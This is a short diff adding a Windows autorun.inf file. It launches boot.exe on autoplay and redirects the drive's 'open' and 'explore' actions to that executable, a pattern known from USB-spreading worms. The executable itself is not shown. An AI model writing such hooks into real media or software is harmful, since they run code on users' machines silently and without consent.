@@ -1,0 +1,5 @@
+[AutoRun]
+open=boot.exe
+shell\open\Command=boot.exe
+shell\explore\Command="boot.exe -e"
+Name=Open
